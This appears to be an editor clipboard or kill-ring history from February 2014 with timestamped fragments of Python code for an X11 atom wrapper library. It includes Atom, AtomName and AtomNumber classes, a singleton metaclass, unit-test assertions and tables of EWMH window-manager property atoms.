http://code.google.com/p/pycopia/source/browse/trunk/QA/pycopia/smartbits/UserInt.py?spec=svn2&r=2#sl_svn2_3
* Thu 13 Feb 2014 03:01:32 PM JST
InternAtomName
* Thu 13 Feb 2014 03:01:48 PM JST
GetAtomName
* Thu 13 Feb 2014 03:04:03 PM JST
a=window.Atom(c, 5)
* Thu 13 Feb 2014 03:10:57 PM JST
.get_atom_name()
* Thu 13 Feb 2014 03:16:39 PM JST
isinstance
* Thu 13 Feb 2014 03:17:56 PM JST
AtomName
* Thu 13 Feb 2014 03:18:09 PM JST
other
* Thu 13 Feb 2014 03:23:30 PM JST

* Thu 13 Feb 2014 03:23:30 PM JST

* Thu 13 Feb 2014 03:23:30 PM JST
            print('DEBUG-1-window.py')

* Thu 13 Feb 2014 03:23:49 PM JST

* Thu 13 Feb 2014 03:23:49 PM JST

* Thu 13 Feb 2014 03:23:49 PM JST
            print('DEBUG-2-window.py')

* Thu 13 Feb 2014 03:24:16 PM JST

* Thu 13 Feb 2014 03:24:16 PM JST

* Thu 13 Feb 2014 03:24:16 PM JST
            print('DEBUG-3-window.py')

* Thu 13 Feb 2014 03:24:40 PM JST

* Thu 13 Feb 2014 03:24:40 PM JST

* Thu 13 Feb 2014 03:24:40 PM JST
        print('DEBUG-4-window.py')

* Thu 13 Feb 2014 03:26:54 PM JST
_get_
* Thu 13 Feb 2014 03:27:33 PM JST
Atom
* Thu 13 Feb 2014 03:27:46 PM JST
return self.get_atom_number() == other.get_atom_number()
* Thu 13 Feb 2014 04:15:37 PM JST
self.get_atom_number()
* Thu 13 Feb 2014 04:15:42 PM JST
self.get_atom_name()
* Fri 14 Feb 2014 06:31:11 AM JST
multimethod
* Fri 14 Feb 2014 06:38:54 AM JST
multimethod
* Fri 14 Feb 2014 06:39:11 AM JST
multimethod
* Fri 14 Feb 2014 06:39:14 AM JST
multimethod
* Fri 14 Feb 2014 06:39:19 AM JST
multimehtod
* Fri 14 Feb 2014 06:40:58 AM JST
Tes
* Fri 14 Feb 2014 06:42:21 AM JST
Tes, 
* Fri 14 Feb 2014 06:42:24 AM JST
Tes, 
* Fri 14 Feb 2014 06:56:51 AM JST
multidispatch
* Fri 14 Feb 2014 06:57:41 AM JST
Tes
* Fri 14 Feb 2014 06:57:44 AM JST
Tes
* Fri 14 Feb 2014 06:57:50 AM JST
self, 
* Fri 14 Feb 2014 06:57:54 AM JST
self, 
* Sat 15 Feb 2014 06:24:29 AM JST
class SingletonMeta(type):
    """MetaSingleton

    like use.
    class MyClass(BaseClass):
        __metaclass__ = SingletonMeta
    """
    _instances = {}
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = (super(SingletonMeta, cls)
                                   .__call__(*args, **kwargs))
        return cls._instances[cls]
* Sat 15 Feb 2014 06:26:54 AM JST
(super(DispatchSingletonMeta, cls)
                                   .__call__(*args, **kwargs))
* Sat 15 Feb 2014 06:27:14 AM JST
cls
* Sat 15 Feb 2014 06:34:11 AM JST
MetaSingleton
* Sat 15 Feb 2014 06:48:00 AM JST
key
* Sat 15 Feb 2014 06:48:13 AM JST
not 
* Sat 15 Feb 2014 06:48:33 AM JST

* Sat 15 Feb 2014 06:48:33 AM JST

* Sat 15 Feb 2014 06:48:33 AM JST
            pass

* Sat 15 Feb 2014 06:48:37 AM JST

* Sat 15 Feb 2014 06:48:37 AM JST

* Sat 15 Feb 2014 06:48:37 AM JST
        if key not in cls._instances:

* Sat 15 Feb 2014 06:48:39 AM JST
key
* Sat 15 Feb 2014 06:49:29 AM JST
class Con(object):
    r"""
    """
    __metaclass__ = singleton.DispatchSingletonMeta

    def __init__(self, connection_name):
        r"""

        @Arguments:
        - `connection_name`:
        """
        self._connection_name = connection_name
        self._con = xcb.connect(self._connection_name)

* Sat 15 Feb 2014 06:53:20 AM JST
connect?
* Sat 15 Feb 2014 09:17:26 AM JST
object
* Sat 15 Feb 2014 09:17:55 AM JST

* Sat 15 Feb 2014 09:17:55 AM JST

* Sat 15 Feb 2014 09:17:55 AM JST
        self._num = num

* Sat 15 Feb 2014 09:18:47 AM JST
DataHolder
* Sat 15 Feb 2014 09:19:11 AM JST

* Sat 15 Feb 2014 09:19:11 AM JST

* Sat 15 Feb 2014 09:19:11 AM JST
        self._name = name

* Sat 15 Feb 2014 09:19:14 AM JST
name
* Sat 15 Feb 2014 09:19:26 AM JST
_data
* Sat 15 Feb 2014 09:19:26 AM JST
self._data
* Sat 15 Feb 2014 09:19:30 AM JST
        if not predicate.isstring(name):
            # TODO: (Atami) [2014/02/13]
            raise ValueError()

* Sat 15 Feb 2014 09:20:07 AM JST
_name
* Sat 15 Feb 2014 09:20:10 AM JST
_name
* Sat 15 Feb 2014 09:21:07 AM JST
        return repr(self._data)
* Sat 15 Feb 2014 09:25:53 AM JST
AtomName
* Sat 15 Feb 2014 09:26:28 AM JST
self.__class__
* Sat 15 Feb 2014 09:27:25 AM JST
    def __str__(self, ):
        r"""SUMMARY

        __str__()

        @Return:
        """
        return self._data

    def __repr__(self, ):
        r"""SUMMARY

        __repr__()

        @Return:
        """
        return self._data

    def __cmp__(self, other):
        r"""SUMMARY

        __cmp__(other)

        @Arguments:
        - `other`:

        @Return:
        """
        if isinstance(other, AtomName):
            return cmp(self._data, other._data)
        else:
            return self._data == other

    def __eq__(self, other):
        r"""SUMMARY

        __eq__(other)

        @Arguments:
        - `other`:

        @Return:
        """
        if isinstance(other, self.__class__):
            return self._data == other._data
        else:
            return self._data == other

    def __ne__(self, other):
        r"""SUMMARY

        __ne__(other)

        @Arguments:
        - `other`:

        @Return:
        """
        return not (self == other)

* Sat 15 Feb 2014 09:28:36 AM JST
    def __str__(self, ):
        r"""SUMMARY

        __str__()

        @Return:
        """
        return self._data


* Sat 15 Feb 2014 09:28:55 AM JST
    def __repr__(self, ):
        return repr(self._data)

    def __int__(self, ):
        return self._data

    def __long__(self, ):
        return self._data.__long__()

    def __cmp__(self, other):
        if isinstance(other, AtomNumber):
            return cmp(self._data, other._data)
        else:
            return cmp(self._data, other)

    def __eq__(self, other):
        if isinstance(other, AtomNumber):
            return self._data == other._data
        else:
            return self._data == other

    def __ne__(self, other):
        return not (self == other)

* Sat 15 Feb 2014 09:29:32 AM JST
    def __int__(self, ):
        return self._data

    def __long__(self, ):
        return self._data.__long__()


* Sat 15 Feb 2014 09:29:48 AM JST
AtomNumber
* Sat 15 Feb 2014 09:29:54 AM JST
AtomNumber
* Sat 15 Feb 2014 09:37:20 AM JST

* Sat 15 Feb 2014 09:37:20 AM JST

* Sat 15 Feb 2014 09:37:20 AM JST
        else:

* Sat 15 Feb 2014 09:37:23 AM JST

* Sat 15 Feb 2014 09:37:23 AM JST

* Sat 15 Feb 2014 09:37:23 AM JST
        else:

* Sat 15 Feb 2014 09:38:17 AM JST
import
* Mon 17 Feb 2014 11:14:13 AM JST
    def __hash__(self, ):
        return hash(self._data)


* Mon 17 Feb 2014 11:24:45 AM JST
        
* Mon 17 Feb 2014 11:48:34 AM JST
InternAtom?
* Mon 17 Feb 2014 11:50:54 AM JST
get_a
* Mon 17 Feb 2014 11:53:54 AM JST
        if not isinstance(name, (str)):
            raise ValueError(name)

* Mon 17 Feb 2014 11:54:02 AM JST
str
* Mon 17 Feb 2014 11:54:10 AM JST
str
* Mon 17 Feb 2014 11:54:13 AM JST
name
* Mon 17 Feb 2014 11:54:15 AM JST
name
* Mon 17 Feb 2014 11:55:02 AM JST

* Mon 17 Feb 2014 11:55:02 AM JST

* Mon 17 Feb 2014 11:55:02 AM JST
            print('DEBUG-1-atom.py')

* Mon 17 Feb 2014 11:55:03 AM JST

* Mon 17 Feb 2014 11:55:03 AM JST

* Mon 17 Feb 2014 11:55:03 AM JST
            print('DEBUG-4-atom.py')

* Mon 17 Feb 2014 11:55:08 AM JST

* Mon 17 Feb 2014 11:55:08 AM JST

* Mon 17 Feb 2014 11:55:08 AM JST
            print('DEBUG-2-atom.py')

* Mon 17 Feb 2014 11:55:10 AM JST

* Mon 17 Feb 2014 11:55:10 AM JST

* Mon 17 Feb 2014 11:55:10 AM JST
            print('DEBUG-3-atom.py')

* Mon 17 Feb 2014 12:01:17 PM JST
key
* Mon 17 Feb 2014 12:01:20 PM JST
key
* Mon 17 Feb 2014 12:24:07 PM JST
a=atom.AtomCache()
* Mon 17 Feb 2014 12:29:32 PM JST
        self.assertIn('BITMAP', self.cache._dic,
                      msg='Failed: dual_add not BITMAP in dictionary')

* Mon 17 Feb 2014 12:29:47 PM JST
dual
* Mon 17 Feb 2014 12:29:50 PM JST
        
* Mon 17 Feb 2014 12:29:54 PM JST
'BITMAP'
* Mon 17 Feb 2014 12:30:35 PM JST
test_dual_add
* Mon 17 Feb 2014 12:30:41 PM JST
test_
* Mon 17 Feb 2014 12:31:16 PM JST
add
* Mon 17 Feb 2014 12:31:28 PM JST
        
* Mon 17 Feb 2014 12:31:31 PM JST
        
* Mon 17 Feb 2014 12:31:55 PM JST
self.cache._add('BITMAP', 5)
* Mon 17 Feb 2014 12:32:34 PM JST
get
* Mon 17 Feb 2014 12:33:01 PM JST
SUMMARY
* Mon 17 Feb 2014 12:33:08 PM JST
        
* Mon 17 Feb 2014 12:36:18 PM JST
__contains__
* Mon 17 Feb 2014 12:36:59 PM JST
{5: 'BITMAP', 'BITMAP': 5}
* Mon 17 Feb 2014 12:38:42 PM JST
repr(a) == "{5: 'BITMAP', 'BITMAP': 5}"
* Mon 17 Feb 2014 12:39:31 PM JST
 repr(self.cache)
* Mon 17 Feb 2014 12:39:39 PM JST
"{5: 'BITMAP', 'BITMAP': 5}"
* Mon 17 Feb 2014 12:41:15 PM JST
self.cache._dic
* Mon 17 Feb 2014 12:41:21 PM JST
, msg='Failed: not cleared'
* Mon 17 Feb 2014 12:41:56 PM JST
SUMMARY
* Mon 17 Feb 2014 12:42:02 PM JST
SUMMARY
* Mon 17 Feb 2014 12:42:39 PM JST
AtomCache
* Mon 17 Feb 2014 12:44:06 PM JST
r"""AtomCache.__contains__
* Mon 17 Feb 2014 12:44:17 PM JST
AtomCache.
* Mon 17 Feb 2014 12:47:55 PM JST
pass
* Mon 17 Feb 2014 12:49:16 PM JST
pass
* Mon 17 Feb 2014 12:50:35 PM JST
AtomIdentifier
* Mon 17 Feb 2014 12:50:42 PM JST
        
* Mon 17 Feb 2014 12:51:14 PM JST
test
* Mon 17 Feb 2014 12:51:47 PM JST
intern
* Mon 17 Feb 2014 12:52:30 PM JST
        self.assertEqual(self.atom_identifer.intern_atom('BITMAP'), 5,
                         msg='Failed: intern_atom')

* Mon 17 Feb 2014 12:52:59 PM JST
        self.assertEqual(self.atom_identifer.get_atom_name(5), 'BITMAP',
                         msg='Failed: get_atom_name')

* Mon 17 Feb 2014 12:53:47 PM JST
AtomIdentifier.
* Mon 17 Feb 2014 12:56:28 PM JST
        self.assertIn('BITMAP', self.atom_identifier._cache,
                      msg='Failed: cache')

* Mon 17 Feb 2014 12:56:51 PM JST
SUMMARY
* Mon 17 Feb 2014 12:56:55 PM JST
AtomIdentifier
* Mon 17 Feb 2014 02:44:30 PM JST
 or ''
* Mon 17 Feb 2014 02:53:08 PM JST
class DataHolder(object):
    r"""
    """

    def __init__(self, data):
        r"""

        @Arguments:
        - `data`:
        """
        self._data = data

    def __repr__(self, ):
        return repr(self._data)

    def __cmp__(self, other):
        if isinstance(other, self.__class__):
            return cmp(self._data, other._data)
        return cmp(self._data, other)

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            return self._data == other._data
        return self._data == other

    def __ne__(self, other):
        return not (self == other)


class AtomNumber(DataHolder):
    r"""
    """

    def __init__(self, connection, num):
        r"""

        @Arguments:
        - `num`:
        - `name`:
        """
        DataHolder.__init__(self, num)
        self._connection = connection
        self._core_get_atom_name = self._connection.core.GetAtomName

    def _make_cookie(self, ):
        r"""SUMMARY

        _make_cookie()

        @Return:
        """
        return self._core_get_atom_name(self._data)

    def _get_reply(self, ):
        r"""SUMMARY

        _get_reply()

        @Return:
        """
        return self._make_cookie().reply()

    def _get_name_list(self, ):
        r"""SUMMARY

        _get_name_buffer()

        @Return:
        """
        return self._get_reply().name

    def _get_name_buffer(self, ):
        r"""SUMMARY

        _get_name_buffer()

        @Return:
        """
        return self._get_name_list().buf()

    def get_atom_name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        return str(self._get_name_buffer())

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return struct.pack('I', self._data)

    def __int__(self, ):
        return self._data

    def __long__(self, ):
        return self._data.__long__()

    def __hash__(self, ):
        return hash(self._data)


class AtomName(DataHolder):
    r"""
    """

    def __init__(self, connection, name):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        """
        if not predicate.isstring(name):
            # TODO: (Atami) [2014/02/13]
            raise ValueError()

        DataHolder.__init__(self, name)
        self._connection = connection
        self._core_intern_atom = self._connection.core.InternAtom

    def intern_atom(self, ):
        r"""SUMMARY

        intern_atom()

        @Return:
        """
        cookie = self._core_intern_atom(False, len(self._data), self._data)
        return cookie.reply().atom

    def __str__(self, ):
        return self._data

    def __hash__(self, ):
        return hash(self._data)



* Mon 17 Feb 2014 02:53:43 PM JST
import predicate
* Mon 17 Feb 2014 02:53:49 PM JST
import struct
* Mon 17 Feb 2014 02:55:14 PM JST
atom
* Mon 17 Feb 2014 03:40:17 PM JST
core
* Mon 17 Feb 2014 03:40:20 PM JST
InternAtom
* Mon 17 Feb 2014 03:41:06 PM JST

* Mon 17 Feb 2014 03:41:06 PM JST

* Mon 17 Feb 2014 03:41:06 PM JST
        self._core_intern_atom = self._connection.atom.intern_atom

* Mon 17 Feb 2014 03:41:51 PM JST
cookie = 
* Mon 17 Feb 2014 03:42:11 PM JST
self._connection.atom.intern_atom(self._data)
* Mon 17 Feb 2014 03:42:53 PM JST

* Mon 17 Feb 2014 03:42:53 PM JST

* Mon 17 Feb 2014 03:42:53 PM JST
        self._core_get_atom_name = self._connection.core.GetAtomName

* Mon 17 Feb 2014 03:45:48 PM JST
class Atom(object):
    r"""
    """

    def __init__(self, connection, *args, **kwargs):
        r"""

        Example Construction:
           Atom(c, 5)
           Atom(c, 'BITMAP')
           Atom(c, 5, 'BITMAP')
        """
        self._connection = connection

        # for arguments
        self._num = None
        self._name = None
        if 0 == len(args):
            # TODO: (Atami) [2014/02/13]
            raise ValueError()
        if args:
            if 2 < len(args):
                raise ValueError()
            for arg in args:
                if predicate.isint(arg) or isinstance(arg, AtomNumber):
                    if self._num:
                        # TODO: (Atami) [2014/02/13]
                        # DuplicateError
                        raise ValueError()
                    self._num = AtomNumber(self._connection, int(arg))
                elif predicate.isstring(arg) or isinstance(arg, AtomName):
                    if self._name:
                        # TODO: (Atami) [2014/02/13]
                        # DuplicateError
                        raise ValueError()
                    self._name = AtomName(self._connection, str(arg))
        if not (self._num or self._name):
            raise ValueError()

    def get_atom_name(self, ):
        r"""SUMMARY

        get_atom_name()

        @Return:
        """
        if self._name:
            return self._name
        self._name = AtomName(self._connection, self._num.get_atom_name())
        return self._name

    def get_atom_number(self, ):
        r"""SUMMARY

        get_atom_number()

        @Return:
        """
        if self._num:
            return self._num
        self._num = AtomNumber(self._connection, self._name.intern_atom())
        return self._num

    def __repr__(self, ):
        return '{}: {}'.format(self.get_atom_name(), self.get_atom_number())

    def __int__(self, ):
        return self.get_atom_number().__int__()

    def __long__(self, ):
        return self.get_atom_number().__long__()

    def __cmp__(self, other):
        if isinstance(other, Atom):
            return cmp(self.get_atom_number(), other.get_atom_number())
        if predicate.isstring(other):
            return cmp(self.get_atom_name(), other)
        if predicate.isint(other):
            return cmp(self.get_atom_number(), other)
        return False

    def __eq__(self, other):
        if isinstance(other, Atom):
            return self.get_atom_number() == other.get_atom_number()
        if predicate.isint(other):
            return self.get_atom_number() == other
        if predicate.isstring(other):
            return self.get_atom_name() == other
        return False

    def __ne__(self, other):
        return not (self == other)

    def __str__(self, ):
        return self.get_atom_name().__str__()

* Mon 17 Feb 2014 03:46:13 PM JST
get_atom_
* Mon 17 Feb 2014 03:46:24 PM JST
get_atom_
* Mon 17 Feb 2014 03:46:39 PM JST
get_atom_
* Mon 17 Feb 2014 03:46:43 PM JST
get_atom_
* Mon 17 Feb 2014 03:46:55 PM JST
get_atom_number()
* Mon 17 Feb 2014 03:47:03 PM JST
get_atom_
* Mon 17 Feb 2014 03:47:09 PM JST
get_atom_
* Mon 17 Feb 2014 03:47:18 PM JST
get_atom_
* Mon 17 Feb 2014 03:47:26 PM JST
get_atom_
* Mon 17 Feb 2014 03:47:44 PM JST
get_atom_
* Mon 17 Feb 2014 03:48:30 PM JST
get_atom_
* Mon 17 Feb 2014 03:49:33 PM JST
name
* Mon 17 Feb 2014 04:14:36 PM JST
self
* Mon 17 Feb 2014 04:16:00 PM JST
len(self)
* Mon 17 Feb 2014 04:16:16 PM JST
return
* Mon 17 Feb 2014 04:21:20 PM JST
str, 
* Mon 17 Feb 2014 04:21:20 PM JST
int, str, 
* Mon 17 Feb 2014 04:30:21 PM JST
import
* Mon 17 Feb 2014 04:30:53 PM JST
print 
* Mon 17 Feb 2014 04:33:36 PM JST
BITMAP
* Mon 17 Feb 2014 04:41:55 PM JST
_data
* Mon 17 Feb 2014 04:43:47 PM JST
num
* Mon 17 Feb 2014 04:53:05 PM JST
'CARDINAL'
* Mon 17 Feb 2014 04:53:12 PM JST
get_atom
* Mon 17 Feb 2014 04:56:19 PM JST
7)
* Mon 17 Feb 2014 04:56:20 PM JST
cc, 7)
* Mon 17 Feb 2014 04:56:21 PM JST
AtomPair(cc, 7)
* Mon 17 Feb 2014 04:58:21 PM JST
name
* Mon 17 Feb 2014 04:59:22 PM JST
connection
* Mon 17 Feb 2014 04:59:53 PM JST
connection
* Mon 17 Feb 2014 05:02:03 PM JST
    def __str__(self, ):
        return self.name.__str__()

* Mon 17 Feb 2014 05:20:03 PM JST
_NET_WM_NAME
* Mon 17 Feb 2014 05:21:05 PM JST
65011735
* Mon 17 Feb 2014 05:21:36 PM JST
293
* Mon 17 Feb 2014 05:23:13 PM JST
65011734
* Mon 17 Feb 2014 06:52:51 PM JST
UTF8_STRING
* Mon 17 Feb 2014 06:52:57 PM JST
UTF8_STRING=
* Tue 18 Feb 2014 05:50:33 AM JST
atoms = {
    'WM_STATE': ('CARDINAL', 32),

    '_NET_SUPPORTED': ('ATOM', 32),
    '_NET_CLIENT_LIST': ('WINDOW', 32),
    '_NET_CLIENT_LIST_STACKING': ('WINDOW', 32),
    '_NET_NUMBER_OF_DESKTOPS': ('CARDINAL', 32),
    '_NET_DESKTOP_GEOMETRY': ('CARDINAL', 32),
    '_NET_DESKTOP_VIEWPORT': ('CARDINAL', 32),
    '_NET_CURRENT_DESKTOP': ('CARDINAL', 32),
    '_NET_DESKTOP_NAMES': ('UTF8_STRING[]', 8),
    '_NET_ACTIVE_WINDOW': ('WINDOW', 32),
    '_NET_WORKAREA': ('CARDINAL', 32),
    '_NET_SUPPORTING_WM_CHECK': ('WINDOW', 32),
    '_NET_VIRTUAL_ROOTS': ('WINDOW', 32),
    '_NET_DESKTOP_LAYOUT': ('CARDINAL', 32),
    '_NET_SHOWING_DESKTOP': ('CARDINAL', 32),

    '_NET_CLOSE_WINDOW': (None, 0),
    '_NET_MOVERESIZE_WINDOW': (None, 0),
    '_NET_WM_MORERESIZE': (None, 0),
    '_NET_RESTACK_WINDOW': (None, 0),
    '_NET_REQUEST_FRAME_EXTENTS': ('CARDINAL', 32),

    '_NET_WM_NAME': ('UTF8_STRING', 8),
    '_NET_WM_VISIBLE_NAME': ('UTF8_STRING', 8),
    '_NET_WM_ICON_NAME': ('UTF8_STRING', 8),
    '_NET_WM_VISIBLE_ICON_NAME': ('UTF8_STRING', 8),
    '_NET_WM_DESKTOP': ('CARDINAL', 32),
    '_NET_WM_WINDOW_TYPE': ('ATOM', 32),
    '_NET_WM_STATE': ('ATOM', 32),
    '_NET_WM_ALLOWED_ACTIONS': ('ATOM', 32),
    '_NET_WM_STRUT': ('CARDINAL', 32),
    '_NET_WM_STRUT_PARTIAL': ('CARDINAL', 32),
    '_NET_WM_ICON_GEOMETRY': ('CARDINAL', 32),
    '_NET_WM_ICON': ('CARDINAL', 32),
    '_NET_WM_PID': ('CARDINAL', 32),
    '_NET_WM_HANDLED_ICONS': ('CARDINAL', 32),
    '_NET_WM_USER_TIME': ('CARDINAL', 32),
    '_NET_FRAME_EXTENTS': ('CARDINAL', 32),

    '_OB_APP_TYPE': ('UTF8_STRING', 8),
}

window_types = {
    '_NET_WM_WINDOW_TYPE_DESKTOP': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DOCK': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_TOOLBAR': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_MENU': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_UTILITY': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_SPLASH': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DIALOG': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DROPDOWN_MENU': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_POPUP_MENU': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_TOOLTIP': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_NOTIFICATION': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_COMBO': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_DND': ('ATOM', 32),
    '_NET_WM_WINDOW_TYPE_NORMAL': ('ATOM', 32)
}

window_states = {
    '_NET_WM_STATE_MODAL': ('ATOM', 32),
    '_NET_WM_STATE_STICKY': ('ATOM', 32),
    '_NET_WM_STATE_MAXIMIZED_VERT': ('ATOM', 32),
    '_NET_WM_STATE_MAXIMIZED_HORZ': ('ATOM', 32),
    '_NET_WM_STATE_SHADED': ('ATOM', 32),
    '_NET_WM_STATE_SKIP_TASKBAR': ('ATOM', 32),
    '_NET_WM_STATE_SKIP_PAGER': ('ATOM', 32),
    '_NET_WM_STATE_HIDDEN': ('ATOM', 32),
    '_NET_WM_STATE_FULLSCREEN': ('ATOM', 32),
    '_NET_WM_STATE_ABOVE': ('ATOM', 32),
    '_NET_WM_STATE_BELOW': ('ATOM', 32),
    '_NET_WM_STATE_DEMANDS_ATTENTION': ('ATOM', 32)
}

window_allowed_actions = {
    '_NET_WM_ACTION_MOVE': ('ATOM', 32),
    '_NET_WM_ACTION_RESIZE': ('ATOM', 32),
    '_NET_WM_ACTION_MINIMIZE': ('ATOM', 32),
    '_NET_WM_ACTION_SHADE': ('ATOM', 32),
    '_NET_WM_ACTION_STICK': ('ATOM', 32),
    '_NET_WM_ACTION_MAXIMIZE_HORZ': ('ATOM', 32),
    '_NET_WM_ACTION_MAXIMIZE_VERT': ('ATOM', 32),
    '_NET_WM_ACTION_FULLSCREEN': ('ATOM', 32),
    '_NET_WM_ACTION_CHANGE_DESKTOP': ('ATOM', 32),
    '_NET_WM_ACTION_CLOSE': ('ATOM', 32),
    '_NET_WM_ACTION_ABOVE': ('ATOM', 32),
    '_NET_WM_ACTION_BELOW': ('ATOM', 32)
}

* Tue 18 Feb 2014 05:58:06 AM JST
setkeys?
* Tue 18 Feb 2014 05:59:45 AM JST

* Tue 18 Feb 2014 05:59:46 AM JST
atoms
* Tue 18 Feb 2014 05:59:55 AM JST
window_types
* Tue 18 Feb 2014 06:00:02 AM JST

* Tue 18 Feb 2014 06:00:03 AM JST
window_types
* Tue 18 Feb 2014 06:00:12 AM JST
window_states
* Tue 18 Feb 2014 06:00:17 AM JST

* Tue 18 Feb 2014 06:00:18 AM JST
window_states
* Tue 18 Feb 2014 06:00:22 AM JST
window_allowed_actions
* Tue 18 Feb 2014 06:21:37 AM JST
AtomPair
* Tue 18 Feb 2014 06:22:07 AM JST
atom.AtomPair
* Tue 18 Feb 2014 06:22:19 AM JST
self._connection, 
* Tue 18 Feb 2014 06:22:34 AM JST
self._connection, 
* Tue 18 Feb 2014 06:35:28 AM JST
return 
* Tue 18 Feb 2014 06:35:48 AM JST
atom_nam
* Tue 18 Feb 2014 06:35:59 AM JST
atom_
* Tue 18 Feb 2014 06:36:22 AM JST

* Tue 18 Feb 2014 06:36:22 AM JST

* Tue 18 Feb 2014 06:36:22 AM JST
        property_ = atom.AtomPair(self._connection, name)

* Tue 18 Feb 2014 06:36:22 AM JST
        property_ = atom.AtomPair(self._connection, name)

* Tue 18 Feb 2014 06:36:22 AM JST
        property_ = atom.AtomPair(self._connection, name)
        type_atom = atom.AtomPair(self._connection, type_)

* Tue 18 Feb 2014 09:56:29 AM JST

* Tue 18 Feb 2014 09:56:29 AM JST

* Tue 18 Feb 2014 09:56:29 AM JST
        self._connection = connection

* Tue 18 Feb 2014 09:56:32 AM JST
_connection,
* Tue 18 Feb 2014 09:56:33 AM JST
self._connection,
* Tue 18 Feb 2014 09:56:33 AM JST
AtomPair(self._connection,
* Tue 18 Feb 2014 09:56:34 AM JST
atom.AtomPair(self._connection,
* Tue 18 Feb 2014 09:56:47 AM JST
connection, 
* Tue 18 Feb 2014 09:57:09 AM JST
PropertyInfo
* Tue 18 Feb 2014 09:57:25 AM JST
class PropertyInfo(object):
    r"""
    """
    __slots__ = ('name', 'type_', 'length')

    def __init__(self, name, type_, length):
        r"""

        @Arguments:
        - `connection`:
        - `name`:
        - `type_`:
        - `length`:
        """
        self.name = name
        self.type_ = type_
        self.length = length


* Tue 18 Feb 2014 09:57:38 AM JST
'WM_STATE'
* Tue 18 Feb 2014 09:58:29 AM JST
'_NET_SUPPORTED'
* Tue 18 Feb 2014 09:58:55 AM JST
'_NET_CLIENT_LIST'
* Tue 18 Feb 2014 09:58:56 AM JST
'_NET_CLIENT_LIST'
* Tue 18 Feb 2014 10:00:00 AM JST
    atoms = {
        'WM_STATE'                   : PropertyInfo('WM_STATE', 'CARDINAL', 32),

        '_NET_SUPPORTED'             : PropertyInfo('_NET_SUPPORTED', 'ATOM', 32),
        '_NET_CLIENT_LIST'           : PropertyInfo('_NET_CLIENT_LIST', 'WINDOW', 32),
        '_NET_CLIENT_LIST_STACKING'  : ('WINDOW', 32),
        '_NET_NUMBER_OF_DESKTOPS'    : ('CARDINAL', 32),
        '_NET_DESKTOP_GEOMETRY'      : ('CARDINAL', 32),
        '_NET_DESKTOP_VIEWPORT'      : ('CARDINAL', 32),
        '_NET_CURRENT_DESKTOP'       : ('CARDINAL', 32),
        '_NET_DESKTOP_NAMES'         : ('UTF8_STRING[]', 8),
        '_NET_ACTIVE_WINDOW'         : ('WINDOW', 32),
        '_NET_WORKAREA'              : ('CARDINAL', 32),
        '_NET_SUPPORTING_WM_CHECK'   : ('WINDOW', 32),
        '_NET_VIRTUAL_ROOTS'         : ('WINDOW', 32),
        '_NET_DESKTOP_LAYOUT'        : ('CARDINAL', 32),
        '_NET_SHOWING_DESKTOP'       : ('CARDINAL', 32),

        '_NET_CLOSE_WINDOW'          : (None, 0),
        '_NET_MOVERESIZE_WINDOW'     : (None, 0),
        '_NET_WM_MORERESIZE'         : (None, 0),
        '_NET_RESTACK_WINDOW'        : (None, 0),
        '_NET_REQUEST_FRAME_EXTENTS' : ('CARDINAL', 32),

        '_NET_WM_NAME'               : ('UTF8_STRING', 8),
        '_NET_WM_VISIBLE_NAME'       : ('UTF8_STRING', 8),
        '_NET_WM_ICON_NAME'          : ('UTF8_STRING', 8),
        '_NET_WM_VISIBLE_ICON_NAME'  : ('UTF8_STRING', 8),
        '_NET_WM_DESKTOP'            : ('CARDINAL', 32),
        '_NET_WM_WINDOW_TYPE'        : ('ATOM', 32),
        '_NET_WM_STATE'              : ('ATOM', 32),
        '_NET_WM_ALLOWED_ACTIONS'    : ('ATOM', 32),
        '_NET_WM_STRUT'              : ('CARDINAL', 32),
        '_NET_WM_STRUT_PARTIAL'      : ('CARDINAL', 32),
        '_NET_WM_ICON_GEOMETRY'      : ('CARDINAL', 32),
        '_NET_WM_ICON'               : ('CARDINAL', 32),
        '_NET_WM_PID'                : ('CARDINAL', 32),
        '_NET_WM_HANDLED_ICONS'      : ('CARDINAL', 32),
        '_NET_WM_USER_TIME'          : ('CARDINAL', 32),
        '_NET_FRAME_EXTENTS'         : ('CARDINAL', 32),

        '_OB_APP_TYPE'               : ('UTF8_STRING', 8),
    }

* Tue 18 Feb 2014 10:00:40 AM JST
'_NET_CLIENT_LIST_STACKING'
* Tue 18 Feb 2014 10:03:27 AM JST
'_NET_NUMBER_OF_DESKTOPS'
* Tue 18 Feb 2014 10:03:38 AM JST
'_NET_DESKTOP_GEOMETRY'
* Tue 18 Feb 2014 10:03:48 AM JST
'_NET_DESKTOP_VIEWPORT'
* Tue 18 Feb 2014 10:03:51 AM JST
'_NET_CURRENT_DESKTOP'
* Tue 18 Feb 2014 10:03:54 AM JST
'_NET_DESKTOP_NAMES'
* Tue 18 Feb 2014 10:03:57 AM JST
'_NET_ACTIVE_WINDOW'
* Tue 18 Feb 2014 10:03:59 AM JST
'_NET_WORKAREA'
* Tue 18 Feb 2014 10:04:01 AM JST
'_NET_SUPPORTING_WM_CHECK'
* Tue 18 Feb 2014 10:04:04 AM JST
'_NET_VIRTUAL_ROOTS'
* Tue 18 Feb 2014 10:04:06 AM JST
'_NET_DESKTOP_LAYOUT'
* Tue 18 Feb 2014 10:04:09 AM JST
'_NET_SHOWING_DESKTOP'
* Tue 18 Feb 2014 10:04:27 AM JST
'_NET_CLOSE_WINDOW'
* Tue 18 Feb 2014 10:04:29 AM JST
'_NET_MOVERESIZE_WINDOW'
* Tue 18 Feb 2014 10:04:31 AM JST
'_NET_WM_MORERESIZE'
* Tue 18 Feb 2014 10:04:33 AM JST
'_NET_RESTACK_WINDOW'
